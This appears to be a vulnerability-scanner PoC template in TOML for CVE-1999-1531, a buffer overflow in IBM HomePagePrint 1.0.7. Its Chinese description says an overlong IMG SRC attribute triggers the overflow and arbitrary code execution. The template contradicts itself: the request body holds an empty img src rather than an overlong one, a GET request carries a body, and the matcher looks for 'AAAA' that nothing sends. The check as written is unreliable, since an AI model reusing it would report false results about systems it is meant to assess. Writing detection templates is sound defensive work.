[info]
author = "AVE"
description = "IBM HomePagePrint 1.0.7 for Windows98J 缓冲区溢出漏洞验证。通过在 HTML 页面中构造超长 IMG_SRC 属性值，触发 IBM HomePagePrint 缓冲区溢出，导致任意代码执行。"
id = "POC-AVE-1999-1985"
name = "CVE-1999-1531 PoC"
severity = "high"
tags = ["cve-1999-1531"]
vuln_id = [
    "CVE-1999-1531",
    "AVE-1999-1985",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
<html><body><img src=""></body></html>
"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AAAA"]
